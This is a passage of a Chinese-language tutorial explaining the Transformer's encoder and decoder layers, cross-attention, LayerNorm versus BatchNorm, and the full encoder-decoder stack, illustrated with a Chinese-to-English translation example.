<p>接下来，让我们开始动手构建Transformer的编码器模块。与之前介绍的注意力模块一脉相承，<strong>编码器层的核心功能同样是将一个序列转换为另一个序列，并且保持输入与输出的维度一致</strong>。下图清晰地展示了一个标准Transformer编码器层（Transformer Encoder Layer）的内部结构，相信大家都能看懂。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b22f52a00419483ebd741452b65554fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=zAPZJj0MmYs8wkGEnRiFdzsFwmQ%3D" alt="c12.jpg" width="100%" loading="lazy"/></p>
<p>观察这个结构图，你会发现它主要由两大核心组件构成：</p>
<ol>
<li><strong>多头自注意力层（Multi-Head Self-Attention）</strong>：这就是我们上一节所构建的模块，负责让序列中的每个位置都能汇聚全局的上下文信息。</li>
<li><strong>前馈神经网络层（Feed-Forward Network, FFN）</strong>：一个应用于每个位置上的独立、全连接网络，负责对汇聚后的信息进行非线性变换和深层处理。</li>
</ol>
<p>这两个核心组件都被**残差连接（Residual Connection）<strong>和</strong>层归一化（Layer Normalization）**所包裹，形成了“子层 -&gt; 加残差 -&gt; 归一化”的稳定计算单元。</p>
<p>这里要注意一点，就是在线性层Linear那里，第一个线性层将输入向量的维度扩大到一个比较大的维度<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>l</mi><mi>a</mi><mi>r</mi><mi>g</mi><mi>e</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">large\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">a</span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">e</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span>，第二个线性层再将其压缩回原始的 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>e</mi><mi>m</mi><mi>b</mi><mi>e</mi><mi>d</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>i</mi><mi>z</mi><mi>e</mi></mrow><annotation encoding="application/x-tex">embed\_size</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">e</span><span class="mord mathnormal">mb</span><span class="mord mathnormal">e</span><span class="mord mathnormal">d</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">s</span><span class="mord mathnormal">i</span><span class="mord mathnormal">ze</span></span></span></span></span>。</p>
<p>你可能觉得很奇怪，为什么要这样做呢？其实在更高的维度空间中，模型能够学习到更复杂、更细微的特征组合模式。模型从“看山是山”的阶段，到“看山不是山”的阶段，最后又回到了“看山还是山”的阶段，虽然看似首尾相同，其实两个的境界已经不一样了。它已经实现了在更高层次上的回归与升华。</p>
<p>另外，还有一个需要注意的是这里的LayerNorm层，它和我们常见到的BatchNorm非常相似，都是归一化；二者目标相似（加速训练、稳定梯度），但作用维度截然不同。BatchNorm是对同一特征通道，跨不同样本进行归一化，而LayerNorm对单个样本，跨不同特征通道进行归一化。</p>
<p>假设我们有一个简单的数据，形状为 <code>(batch_size=3, embed_size=4)</code>：</p>
<pre><code class="hljs language-python" lang="python">X = [[<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>], 
     [<span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>],  
     [<span class="hljs-number">9</span>, <span class="hljs-number">10</span>,<span class="hljs-number">11</span>,<span class="hljs-number">12</span>]] 
</code></pre>
<ul>
<li><strong>批归一化（BN）</strong> 的操作维度：对于<strong>第一个特征通道</strong>（即所有数据的第一个数字），它会收集 <code>X[0,0]=1</code>, <code>X[1,0]=5</code>, <code>X[2,0]=9</code>这3个值，计算它们的均值与方差，然后用这个统一的分布去归一化这3个值。它对每个特征通道独立进行此操作。</li>
<li><strong>层归一化（LN）</strong> 的操作维度：对于<strong>样本1的第一个位置</strong> <code>X[0] = [1,2,3,4]</code>，它会计算这个长度为4的向量自身的均值和方差，然后用这个均值和方差去归一化这个向量本身。它对每个样本的每个位置独立进行此操作。</li>
</ul>
<p>LayerNorm在这里的好处就是无论序列多长，归一化都在每个位置的向量内进行，因此天生适应变长序列。</p>
<hr/>
<p>再接下来，让我们开始构建 Transformer 的<strong>解码器模块</strong>。解码器的核心功能同样是<strong>将一个序列转换为另一个序列</strong>，但它与编码器有一个关键区别：解码器接收<strong>两个输入</strong>。下图展示了一个标准 Transformer 解码器层（Decoder Layer）的完整结构。相信大家都能看懂，就不做具体讲解了。</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e9cf15c665974a648bb03add1f84fb44~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=Bs63OXk65noYGBow6AFtU0lJ8t4%3D" alt="c13.jpg" width="100%" loading="lazy"/></p>
<p>这里需要额外强调，原始输入矩阵<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>的形状和输出<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>S</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">S_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">S</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.0576em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>的形状是完全相同的，只不过这个附加的输入<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Y_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>有点不一样，它的维度和<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>相同，但是序列长度可以不一样。相信你已经看出来了，这个<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Y_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>就是上一节我们讲的编码器的输出。</p>
<p>另外，我相信很多人在<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Y_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>这里很很多不解，我当时学习的时候就在这个地方卡了很久，不知道<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Y_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>是如何输入到多头注意力中的，我把这个部分的多头注意力模块进行了拆解，如下图所示</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/12c35d3fabb34ef8a5b9e6a7a6997be5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=4QeV2q%2BTeRBenKpimycDgZgJwFA%3D" alt="c15.jpg" width="100%" loading="lazy"/></p>
<p>如图所示：</p>
<ul>
<li>查询矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span></span></span></span></span> 由解码器输入 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span> 经过线性变换得到：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi><mo>=</mo><mi>X</mi><msub><mi>W</mi><mi>q</mi></msub></mrow><annotation encoding="application/x-tex">Q = X W_q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.9694em;vertical-align:-0.2861em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">q</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.2861em;"><span/></span></span></span></span></span></span></span></span></span>。</li>
<li>键矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi></mrow><annotation encoding="application/x-tex">K</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span></span></span></span></span> 和值矩阵 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi></mrow><annotation encoding="application/x-tex">V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span> 则由编码器输出 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Y_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span> 经过<strong>各自独立</strong>的线性变换得到：<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mo>=</mo><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub><msub><mi>W</mi><mi>k</mi></msub></mrow><annotation encoding="application/x-tex">K = Y_{out} W_k</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.3361em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>, <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>V</mi><mo>=</mo><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub><msub><mi>W</mi><mi>v</mi></msub></mrow><annotation encoding="application/x-tex">V = Y_{out} W_v</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span><span class="mspace" style="margin-right:0.2778em;"/><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"/></span><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">W</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.1514em;"><span style="top:-2.55em;margin-left:-0.1389em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">v</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>。</li>
</ul>
<p>此后的计算流程与标准自注意力完全相同。这样一来，解码器中的每个位置都能够根据自身的需要（<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>Q</mi></mrow><annotation encoding="application/x-tex">Q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal">Q</span></span></span></span></span>），有选择地从编码器输出的所有位置（<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>K</mi><mo separator="true">,</mo><mi>V</mi></mrow><annotation encoding="application/x-tex">K, V</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8778em;vertical-align:-0.1944em;"/><span class="mord mathnormal" style="margin-right:0.07153em;">K</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.1667em;"/><span class="mord mathnormal" style="margin-right:0.22222em;">V</span></span></span></span></span>）中汇聚信息。这个环节的学术名称就是“交叉注意力”。</p>
<p>最后，还有一个关键问题：就是为什么编码器的输出<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>Y</mi><mrow><mi>o</mi><mi>u</mi><mi>t</mi></mrow></msub></mrow><annotation encoding="application/x-tex">Y_{out}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8333em;vertical-align:-0.15em;"/><span class="mord"><span class="mord mathnormal" style="margin-right:0.22222em;">Y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.2806em;"><span style="top:-2.55em;margin-left:-0.2222em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">o</span><span class="mord mathnormal mtight">u</span><span class="mord mathnormal mtight">t</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span/></span></span></span></span></span></span></span></span></span>的序列长度<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>e</mi><mi>w</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">new\_seq\_len</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span></span></span></span></span>和原始输入<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>X</mi></mrow><annotation encoding="application/x-tex">X</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6833em;"/><span class="mord mathnormal" style="margin-right:0.07847em;">X</span></span></span></span></span>的长度<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">seq\_len</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span></span></span></span></span>可以不一样？其实很简单，你自己试一试就知道了，将这两个不一样长度的矩阵输入到自注意力矩阵中，按照上述讲解的自注意力矩阵算法，自己动手，看看其输出矩阵的形状是什么样子的。</p>
<p>最后你会发现<strong>输出序列长度与解码器输入长度 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">seq\_len</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span></span></span></span></span> 保持一致，而与编码器输出长度 <span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi><mi>e</mi><mi>w</mi><mi mathvariant="normal">_</mi><mi>s</mi><mi>e</mi><mi>q</mi><mi mathvariant="normal">_</mi><mi>l</mi><mi>e</mi><mi>n</mi></mrow><annotation encoding="application/x-tex">new\_seq\_len</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0044em;vertical-align:-0.31em;"/><span class="mord mathnormal">n</span><span class="mord mathnormal">e</span><span class="mord mathnormal" style="margin-right:0.02691em;">w</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal">se</span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="mord" style="margin-right:0.02778em;">_</span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mord mathnormal">e</span><span class="mord mathnormal">n</span></span></span></span></span> 无关</strong>。正是这一特性赋予了 Transformer 极大的灵活性，使其能够轻松处理如机器翻译中源语言与目标语言句子长度不等的情况，<strong>实现了输入与输出序列长度的解耦</strong>。</p>
<hr/>
<p>最后的最后，我们将上文中讲解的编码器层（Transformer Encoder Layer）与解码器层（Transforme Decoder Layer）模块，按照论文《Attention Is All You Need》中的蓝图，层层堆叠、顺序连接，最终构建出 Transformer 模型的完整架构。其整体结构如下图所示，它清晰展示了数据从输入到输出的完整流程：</p>
<p align="center"><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4a4ade1bb54b49bdbced29db6617d020~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgTmFycmFzdG9yeQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1766470318&amp;x-signature=R29Oc559wEvBd7andofff%2Fm0fsA%3D" alt="c14.jpg" width="100%" loading="lazy"/></p>
<p align="center">「最右侧的Transformer架构图来源：《Attention Is All You Need》」</p>
<p>由于 Transformer 架构设计的初衷就是为了解决序列到序列（Seq2Seq）任务，特别是机器翻译，因此我们以中英翻译为例来阐释这个网络的工作流程。你会看到，其设计哲学与人类翻译的过程有异曲同工之妙。</p>
<p>先来看左侧的编码器堆栈，它是由<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span>个完全相同的编码器层（Transformer Encoder Layer）堆叠而成。信息在层间逐级传递、不断被提炼和抽象，在最后一层输出的是一个富含整个输入序列上下文信息的<strong>高级语义表示矩阵</strong>。这个高级语义矩阵将被复制多份，传输给解码器堆栈中的<strong>每一个</strong>解码器层作为“知识参考”。</p>
<p>再来看右侧的解码器堆栈，它同样是由<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>n</mi></mrow><annotation encoding="application/x-tex">n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.4306em;"/><span class="mord mathnormal">n</span></span></span></span></span>个完全相同的解码器层（Transforme Decoder Layer）堆叠而成。它的职责是<strong>参考编码器提供的“高级语义矩阵”，自主地、逐个单词地生成目标语言句子</strong>。</p>
<p>可以这样理解，假设我们要翻译“人山人海”，我们肯定不是直接逐字翻译成“people mountain people sea”，这太怪了。而是我们在理解了“人山人海”所表达的意思后（这就是编码器干的事情），然后按照这个意思翻译成英文（这就是解码器），“a huge crowd of people”。</p>
<blockquote>
<p>题外话：说到翻译，我想到了一个有趣的解读。很多人都说中国的古诗词，文言文，很难翻译成英文，因为翻译后就丢失了原有的中文的那种感觉和意境，比如“孤舟蓑笠翁，独钓寒江雪”，你怎么翻译都翻译不出这种味道；同样的，一些英文诗只有在英文的语境下才能体会它的美，翻译成中文就变成大白话了。或许正如一句名言所说：什么是诗？诗，就是在翻译中丢失的东西（Lost in Translation）。</p>
</blockquote>
<p>那如何使用这个网络呢？如何利用它训练一个中译英翻译器呢？</p>
<p>就以中文“我喜欢深度学习”翻译成英文“I like deep learning”为例，来详细解析其训练流程。这本质上是一个序列到序列（Seq2Seq）的监督学习任务：源句作为输入，目标句作为标签。</p>
<p>首先进行数据预处理与分词：</p>
<ul>
